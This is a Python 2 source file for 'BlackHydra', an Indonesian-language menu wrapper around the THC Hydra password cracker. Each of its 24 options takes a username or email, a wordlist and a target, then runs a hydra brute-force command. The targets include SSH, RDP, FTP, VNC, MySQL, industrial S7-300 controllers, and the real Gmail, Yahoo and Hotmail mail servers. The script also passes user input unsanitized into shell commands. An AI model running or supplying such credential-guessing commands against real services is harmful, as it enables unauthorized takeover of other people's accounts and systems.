#!/usr/bin/python
# -*- coding: utf-8 -*-
# Blackhydra
# Coded by Nedi Senja
# Github: https://github.com/stepbystepexe/Blackhydra

from __opt__ import *
import os, sys, time, random, marshal

info = """
Nama        : BlackHydra
Versi       : 2.0 (Update: 11 Agustus 2020, 2:00 PM)
Tanggal     : 01 Februari 2019
Author      : Nedi Senja
Tujuan      : Sengaja di encrypt dari THC Hydra
              biar lebih simpel
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \033[4mGunakan tool ini dengan bijak \033[0m]\n """

example = """\033[0;41;77;1m[          Black Hydra, My Github: @stepbystepexe        ]\033[0m"""

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def loads():
    x = [
     '.   ', '..  ', '... ']
    for o in x:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' + o,
        sys.stdout.flush()
        time.sleep(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
time.sleep(1)
print
print(logo)
print(example)
print
print ("\033[0m[\033[1;96;2m01\033[0m] \033[1;77mCisco    \033[0m[\033[1;96;2m07\033[0m] \033[1;77mTelnet    \033[0m[\033[1;96;2m13\033[0m] \033[1;77mImap     \033[0m[\033[1;96;2m19\033[0m] \033[1;77mRedis  ")
print ("\033[0m[\033[1;96;2m02\033[0m] \033[1;77mVNC      \033[0m[\033[1;96;2m08\033[0m] \033[1;77mYahoo     \033[0m[\033[1;96;2m14\033[0m] \033[1;77msshKey   \033[0m[\033[1;96;2m20\033[0m] \033[1;77mPywhere")
print ("\033[0m[\033[1;96;2m03\033[0m] \033[1;77mFTP      \033[0m[\033[1;96;2m09\033[0m] \033[1;77mHotmail   \033[0m[\033[1;96;2m15\033[0m] \033[1;77mPop3     \033[0m[\033[1;96;2m21\033[0m] \033[1;77mNntp   ")
print ("\033[0m[\033[1;96;2m04\033[0m] \033[1;77mGmail    \033[0m[\033[1;96;2m10\033[0m] \033[1;77mRouter    \033[0m[\033[1;96;2m16\033[0m] \033[1;77mRexec    \033[0m[\033[1;96;2m22\033[0m] \033[1;77ms7-300 ")
print ("\033[0m[\033[1;96;2m05\033[0m] \033[1;77mSSH      \033[0m[\033[1;96;2m11\033[0m] \033[1;77mRDP       \033[0m[\033[1;96;2m17\033[0m] \033[1;77mXmpp     \033[0m[\033[1;96;2m23\033[0m] \033[1;77mSocks5 ")
print ("\033[0m[\033[1;96;2m06\033[0m] \033[1;77mTeam     \033[0m[\033[1;96;2m12\033[0m] \033[1;77mMySQL     \033[0m[\033[1;96;2m18\033[0m] \033[1;77mAdam     \033[0m[\033[1;96;2m24\033[0m] \033[1;77mRlogin ")
print
print("\033[0m[\033[93;1m&\033[0m] LISENSI")
print("\033[0m[\033[94;1m#\033[0m] Informasi")
print("\033[0m[\033[92;1m*\033[0m] Perbarui")
print("\033[0m[\033[91;1m-\033[0m] Keluar")
print
option = raw_input("\n\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
if option == '01' or option == '1':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -P %s %s cisco" % (word, iphost))
        print
        sys.exit(1)
elif option == '02' or option == '2':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
        print
        sys.exit(1)
elif option == '03' or option == '3':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '04' or option == '4':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        email = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mEmail: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
        print
        sys.exit(1)
elif option == '05' or option == '5':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '06' or option == '6':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '07' or option == '7':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '08' or option == '8':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        email = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mEmail: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
        print
        sys.exit(1)
elif option == '09' or option == '9':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        email = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mEmail: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
        print
        sys.exit(1)
elif option == '10':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '11':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '12':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        loads()
        print
        print
        os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
        print
        sys.exit(1)
elif option == '13':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -p %s %s imap" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '14':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s -s 8676 %s sshkey" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '15':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s pop3" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '16':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s rexec" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '17':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s xmpp" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '18':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -P %s %s adam6500" % (word, iphost))
        print
        sys.exit(1)
elif option == '19':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -P %s %s redis" % (word, iphost))
        print
        sys.exit(1)
elif option == '20':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s pcanywhere" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '21':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s nntp" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '22':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -P %s %s s7-300" % (word, iphost))
        print
        sys.exit(1)
elif option == '23':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s socks5" % (user, word, iphost))
        print
        sys.exit(1)
elif option == '24':
        print
        write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
        print
        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mPengguna: \033[0m")
        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
        loads()
        print
        print
        os.system("hydra -l %s -P %s %s rlogin" % (user, word, iphost))
        print
        sys.exit(1)
elif option.strip() in '& 25 lisensi'.split():
        print
        os.system('nano LICENSE')
        print
        restart()
elif option.strip() in '# 26 info'.split():
        os.system('clear')
        print(example)
        os.system('toilet -f smslant Hydra')
        print(info)
        time.sleep(1)
        print
        raw_input('[ Tekan Enter ]')
        restart()
elif option.strip() in '* 27 perbarui'.split():
        print
        os.system('git pull origin master')
        print
        raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
        restart()
elif option.strip() in '- 0 keluar'.split():
        print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
        print
        sys.exit(1)
else:
        print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
        print
        time.sleep(1)
        restart()
